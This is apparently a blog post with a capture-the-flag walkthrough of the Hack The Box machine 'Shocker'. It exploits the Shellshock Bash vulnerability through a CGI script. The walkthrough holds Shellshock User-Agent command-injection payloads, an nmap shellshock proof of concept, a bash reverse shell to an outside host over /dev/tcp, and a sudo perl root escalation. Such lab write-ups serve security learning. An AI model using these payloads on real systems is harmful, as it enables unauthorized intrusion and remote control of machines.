@@ -1,0 +1,448 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>HTB_Shocker | HackThe4O4</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Shocker一、Shellshock的背景Shellshock，又稱Bashdoor，是在Unix中廣泛使用的Bash shell中的一個安全漏洞，首次於2014年9月24日公開。許多互聯網守護進程，如網頁服務器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下訪問計算機系統。 二、通過試驗和總結，Shellshock漏洞執行的條件1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB_Shocker">
+<meta property="og:url" content="https://no-flag.com/2024/12/21/Shocker/index.html">
+<meta property="og:site_name" content="HackThe4O4">
+<meta property="og:description" content="Shocker一、Shellshock的背景Shellshock，又稱Bashdoor，是在Unix中廣泛使用的Bash shell中的一個安全漏洞，首次於2014年9月24日公開。許多互聯網守護進程，如網頁服務器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下訪問計算機系統。 二、通過試驗和總結，Shellshock漏洞執行的條件1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_1.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_2.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_3.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_4.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_5.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_6.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_7.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_8.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_9.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_10.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_11.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_12.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_13.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_14.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_15.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_16.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_17.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_18.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_19.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_20.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_21.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_22.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_23.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_24.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_25.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_26.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_27.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_28.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_29.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_30.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_31.png">
+<meta property="og:image" content="https://no-flag.com/img/shocker_Untitled_32.png">
+<meta property="article:published_time" content="2024-12-21T12:32:07.095Z">
+<meta property="article:modified_time" content="2024-03-02T09:40:54.444Z">
+<meta property="article:author" content="Noflag">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://no-flag.com/img/shocker_Untitled.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+	<!-- If needed, replace your own web font service -->
+  <link href="https://fonts.googleapis.com/css?family=Crimson+Text:400,700|Inconsolata|Oswald" rel="stylesheet" />
+
+  
+   
+  
+<link rel="stylesheet" href="/icomoon/style.css">
+
+  
+<link rel="stylesheet" href="/style.css">
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="site-wrapper is_post_page">
+    <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<script>document.getElementById("loading-bar").style.width="20%";</script>
+
+
+<header id="header" class="site-header clearfix">
+
+  <a class="logo square clearfix" href="/">
+    <!-- 
+      Replace with your own size name, for example:
+      <span class="b">A</span>
+      <span class="w">B</span>
+      <span class="b">C</span>
+     -->
+     <span class="b">A</span>
+     <span class="b">R</span>
+     <span class="b">T</span>
+     <span class="w">I</span>
+     <span class="w">F</span>
+     <span class="b">A</span>
+     <span class="b">C</span>
+     <span class="b">T</span>
+  </a>
+  <a class="me square site-nav-switch clearfix">
+    <span class="b">
+    	<span class="icon icon-menu"></span>
+    </span>
+  </a>
+
+</header>
+
+    <script>document.getElementById("loading-bar").style.width="40%";</script>
+    <main id="main" class="clearfix">
+      <article id="Shocker-Shocker"
+  class="article white-box article-type-Shocker"
+  itemscope itemprop="blogPost">
+
+  <header class="article-header">
+    <h1 class="article-title" itemprop="name">
+      HTB_Shocker
+    </h1>
+    <div class="article-meta">
+      Posted on 
+      <time class="article-time" datetime="2024-12-21T12:32:07.095Z" itemprop="datePublished">
+        Dec 21, 2024
+      </time>
+    </div>
+  </header>
+
+  <div class="article-entry" itemprop="articleBody">
+    <h1 id="Shocker"><a href="#Shocker" class="headerlink" title="Shocker"></a>Shocker</h1><p>一、Shellshock的背景<br>Shellshock，又稱Bashdoor，是在Unix中廣泛使用的Bash shell中的一個安全漏洞，首次於2014年9月24日公開。許多互聯網守護進程，如網頁服務器，使用bash來處理某些命令，從而允許攻擊者在易受攻擊的Bash版本上執行任意代碼。這可使攻擊者在未授權的情況下訪問計算機系統。</p>
+<p>二、通過試驗和總結，Shellshock漏洞執行的條件<br>1、首先是Unix、linux等系統下的bash版本必須小於等於4.1版本；<br>2、可以猜出&#x2F;cgi-bin&#x2F;下目錄的文件；例如：&#x2F;cgi-bin&#x2F;test-cgi、&#x2F;cgi-bin&#x2F;test.sh、&#x2F;cgi-bin&#x2F;test.py、&#x2F;cgi-bin&#x2F;test.perl等等；<br>3、&#x2F;cgi-bin&#x2F;下的腳本文件通過系統環境變量調用bash的環境；</p>
+<p>nmap -sV -sC -A 10.129.108.18</p>
+<p><img src="/img/shocker_Untitled.png" alt="Untitled"></p>
+<ul>
+<li>80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))</li>
+<li>2222&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</li>
+</ul>
+<p>Now open the website </p>
+<p><img src="/img/shocker_Untitled_1.png" alt="Untitled"></p>
+<p>The page source is quite short</p>
+<p><img src="/img/shocker_Untitled_2.png" alt="Untitled"></p>
+<p>Here use feroxbuster scan the HTBIP</p>
+<ul>
+<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -x php,html</li>
+</ul>
+<p><img src="/img/shocker_Untitled_3.png" alt="Untitled"></p>
+<p>Typically, most webservers will handle a request to a directory without a trailing slash by sending a redirect to the same path but with the trailing slash</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">dirsearch</a> and <code>dirb</code> actually take the input wordlist and loop over each entry sending two requests, with and without the trailing slash</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a></li>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18/</a></li>
+</ul>
+<p>We all know that in the previous scan results, redirection will be performed. Here, selecting -n will not perform this action, and -f will add “&#x2F;“ to the URL of each request</p>
+<ul>
+<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/">http://10.129.108.18</a> -f -n</li>
+</ul>
+<p><img src="/img/shocker_Untitled_4.png" alt="Untitled"></p>
+<p>A CGI-bin is a folder used to house scripts that will interact with a Web browser to provide functionality for a Web page or website. Common Gateway Interface (CGI) is a resource for accommodating the use of scripts in Web design. As scripts are sent from a server to a Web browser, the CGI-bin is often referenced in a url.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a></li>
+</ul>
+<blockquote>
+<p>CGI scripts are perl scripts</p>
+</blockquote>
+<p>It can be known that cgi stores many scripts in it, here use -x to search for the file extension of the file below</p>
+<ul>
+<li>feroxbuster -u <a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/">http://10.129.108.18/cgi-bin/</a> -x sh,cgi,pl</li>
+</ul>
+<p><img src="/img/shocker_Untitled_5.png" alt="Untitled"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://10.129.108.18/cgi-bin/user.sh">http://10.129.108.18/cgi-bin/user.sh</a></li>
+</ul>
+<p><img src="/img/shocker_Untitled_6.png" alt="Untitled"></p>
+<p>when i browse the content</p>
+<p><img src="/img/shocker_Untitled_7.png" alt="Untitled"></p>
+<p>Now open the burp and setting something</p>
+<ul>
+<li>Proxy &gt; options</li>
+</ul>
+<p><img src="/img/shocker_Untitled_8.png" alt="Untitled"></p>
+<p>Select to intercept the server’s request here, and further observe the contents of the. sh file</p>
+<p><img src="/img/shocker_Untitled_9.png" alt="Untitled"></p>
+<p><img src="/img/shocker_Untitled_10.png" alt="Untitled"></p>
+<p>Next step is execute shellshock </p>
+<ul>
+<li>locate nse | grep shellshock</li>
+</ul>
+<blockquote>
+<p>&#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</p>
+</blockquote>
+<ul>
+<li>cat &#x2F;usr&#x2F;share&#x2F;nmap&#x2F;scripts&#x2F;http-shellshock.nse</li>
+</ul>
+<p><img src="/img/shocker_Untitled_11.png" alt="Untitled"></p>
+<ul>
+<li>POC ⇒ nmap -sV -p80 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 10.129.108.18</li>
+</ul>
+<p>Set HTTP proxy and redirect in burp</p>
+<p><img src="/img/shocker_Untitled_12.png" alt="Untitled"></p>
+<p><img src="/img/shocker_Untitled_13.png" alt="Untitled"></p>
+<p><img src="/img/shocker_Untitled_14.png" alt="Untitled"></p>
+<p>Change the exploit according to the redirection IP and port set in the previous burp</p>
+<ul>
+<li>nmap -sV -p8081 –script http-shellshock –script-args uri&#x3D;&#x2F;cgi-bin&#x2F;user.sh,cmd&#x3D;ls 127.0.0.1</li>
+</ul>
+<p>At the same time of issuing this command, it is also necessary to enable burp and proxy intercept on</p>
+<blockquote>
+<p>In orde</p>
+</blockquote>
+<p>If successful, burp will show this screen</p>
+<p><img src="/img/shocker_Untitled_15.png" alt="Untitled"></p>
+<p>Then click forward all the way, until this screen appears</p>
+<p><img src="/img/shocker_Untitled_16.png" alt="Untitled"></p>
+<p>Check the HTTP History and find the screen record of the successful execution</p>
+<p><img src="/img/shocker_Untitled_17.png" alt="Untitled"></p>
+<p>send this record to repeate</p>
+<p><img src="/img/shocker_Untitled_18.png" alt="Untitled"></p>
+<p><strong>ShellShock test</strong></p>
+<ul>
+<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;id</li>
+</ul>
+<p><img src="/img/shocker_Untitled_19.png" alt="Untitled"></p>
+<ul>
+<li>() { :;}; echo; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
+</ul>
+<p><img src="/img/shocker_Untitled_20.png" alt="Untitled"></p>
+<ul>
+<li>() { :;}; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os;os.system(“echo; &#x2F;bin&#x2F;ping -c 2 10.129.108.18”)’; &#x2F;bin&#x2F;ping -c 1 10.129.108.18</li>
+</ul>
+<p><img src="/img/shocker_Untitled_21.png" alt="Untitled"></p>
+<ul>
+<li>() { :;}; echo; &#x2F;usr&#x2F;bin&#x2F;python3 -c ‘import os; os.system(“&#x2F;bin&#x2F;ping -c 1 10.129.108.18”)’; &#x2F;usr&#x2F;bin&#x2F;id</li>
+</ul>
+<p><img src="/img/shocker_Untitled_22.png" alt="Untitled"></p>
+<p>Now change the proxy to intercept off and execute the namp instruction just now</p>
+<p><img src="/img/shocker_Untitled_23.png" alt="Untitled"></p>
+<p>After running the result, go back to burp to see the HTTP history, and you will see that () { :;}; ls is executed, but 500 Internal Server Error is returned</p>
+<p><img src="/img/shocker_Untitled_24.png" alt="Untitled"></p>
+<p>Logically speaking, it should not be a 500 response, referring to the previous expoit, I guess it is related to whether there is an echo;</p>
+<p>Sure enough, the response is indeed normal.</p>
+<p><img src="/img/shocker_Untitled_25.png" alt="Untitled"></p>
+<ul>
+<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;ls</li>
+</ul>
+<p><img src="/img/shocker_Untitled_26.png" alt="Untitled"></p>
+<p>This is because there will be a blank line between the header and the text. If the line is missing, there will be 500 responses, so add echo;</p>
+<ul>
+<li>User-Agent: () { :;}; echo; &#x2F;bin&#x2F;bash -c whoami</li>
+</ul>
+<p><img src="/img/shocker_Untitled_27.png" alt="Untitled"></p>
+<p>now use reverse shell cheat sheet</p>
+<p><a target="_blank" rel="noopener" href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+<blockquote>
+<p><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code></p>
+</blockquote>
+<ul>
+<li>nc -nlvp 4444</li>
+<li>() { :;}; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.6&#x2F;4444 0&gt;&amp;1</li>
+</ul>
+<p><img src="/img/shocker_Untitled_28.png" alt="Untitled"></p>
+<p>Now you can get the flag of general users</p>
+<p><img src="/img/shocker_Untitled_29.png" alt="Untitled"></p>
+<ul>
+<li>sudo -l to see What the current user has permission to do</li>
+</ul>
+<p>User shelly may run the following commands on Shocker:</p>
+<blockquote>
+<p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;perl</p>
+</blockquote>
+<p><img src="/img/shocker_Untitled_30.png" alt="Untitled"></p>
+<ul>
+<li><p>sudo perl -e ‘exec(“&#x2F;bin&#x2F;sh -i”)’</p>
+<p>  <img src="/img/shocker_Untitled_31.png" alt="Untitled"></p>
+</li>
+<li><p>find &#x2F; -name root.txt</p>
+</li>
+</ul>
+<p><img src="/img/shocker_Untitled_32.png" alt="Untitled"></p>
+
+  </div>
+  
+  <div class="article-tags">
+    
+  </div>
+
+  
+
+</article>
+
+      <script>document.getElementById("loading-bar").style.width="60%";</script>
+    </main>
+    
+<footer id="footer" class="clearfix">
+	
+  <div>&copy; <a href="https://no-flag.com">HackThe4O4</a> Theme by <a href="http://artifact.me/" target="_blank">Art Chen</a>.</div>
+  <div>Powered by <a target="_blank" href="https://hexo.io/" rel="external noopener">Hexo</a>.</div>
+</footer>
+
+
+    <script>document.getElementById("loading-bar").style.width="80%";</script>
+    <div class="overlay"></div>
+  </div>
+  <div class="site-sidebar">
+
+	
+	
+	<div class="sidebar-switch clearfix "
+		style="display: none">
+		<a class="dark-btn active" data-toggle="toc">
+	    <span class="icon icon-list"></span>
+	    <span class="text">Index</span>
+	  </a>
+	  <a class="dark-btn" data-toggle="bio">
+	    <span class="icon icon-person"></span>
+	    <span class="text">Bio</span>
+	  </a>
+	</div>
+
+	<div class="site-toc "
+		style="display: none">
+		
+	    <div class="no-index">No Index</div>
+	  
+  </div>
+  
+	<div class="site-bio show"
+		style="display: block">
+		
+	  <!-- About Me -->
+	  <div class="about-me clearfix">
+	    <div class="avatar">
+	      <img src="/img/avatar.png" />
+	    </div>
+	    <div class="info">
+	      <a class="name dark-btn" href="/about">
+	        Noflag
+	      </a>
+	    </div>
+	    <div class="info">
+	      <span class="item desc">
+	        Documenting the journey of cyber security
+	      </span>
+	    </div>
+	  </div>
+	
+	  <!-- Social Icons -->
+	  <div class="social clearfix">
+	    
+	      
+	        <a href="/atom.xml" class="feed"
+	          target="_blank" rel="external">
+	          <span class="icon icon-feed"></span>
+	        </a>
+	      
+	        <a href="https://github.com/artchen" class="github"
+	          target="_blank" rel="external">
+	          <span class="icon icon-github"></span>
+	        </a>
+	      
+	    
+	  </div>
+
+	</div>
+
+	<div class="shortcuts">
+		<a href="#header" class="top window-nav dark-btn" id="go-top">
+			<span class="icon icon-chevron-thin-up"></span>
+		</a>
+		<a class="close dark-btn" id="sidebar-close">
+			<span class="icon icon-close"></span>
+		</a>
+		<a href="#footer" class="top window-nav dark-btn" id="go-bottom">
+			<span class="icon icon-chevron-thin-down"></span>
+		</a>
+	</div>
+
+</div>
+
+  <!-- Universal Search -->
+
+<script type="text/javascript">
+  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
+  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
+  var ALGOLIA_API_KEY = "";
+  var ALGOLIA_APP_ID = "";
+  var ALGOLIA_INDEX_NAME = "";
+  var AZURE_SERVICE_NAME = "";
+  var AZURE_INDEX_NAME = "";
+  var AZURE_QUERY_KEY = "";
+  var BAIDU_API_ID = "";
+  var SEARCH_SERVICE = "google";
+  var universalSearchConfig = {};
+  if (SEARCH_SERVICE === 'google') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
+      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'algolia') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      apiKey: ALGOLIA_API_KEY,
+      appId: ALGOLIA_APP_ID,
+      indexName: ALGOLIA_INDEX_NAME,
+      imagePath: "/img/"
+    };
+  } else if (SEARCH_SERVICE === 'azure') {
+    universalSearchConfig = {
+      searchService: SEARCH_SERVICE,
+      serviceName: AZURE_SERVICE_NAME,
+      indexName: AZURE_INDEX_NAME,
+      apiKey: AZURE_QUERY_KEY,
+      imagePath: "/img/"
+    };
+  }
+</script>
+
+<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+<script>window.jQuery || document.write('<script src="/js/jquery.js"><\/script>')</script>
+
+
+<script src="/js/search.js"></script>
+
+
+<script src="/js/app.js"></script>
+
+
+<!-- Disqus -->
+
+
+
+<!-- Valine -->
+
+
+<!-- Swiftype -->
+<!-- Please replace with your own swiftype settings -->
+<!--
+<script type="text/javascript">
+  /* Swiftype */
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','FHMeAyBdVccJECstf-XJ','2.0.0');
+</script>
+-->
+
+  <script>document.getElementById("loading-bar").style.width="100%";</script>
+</body>
+</html>
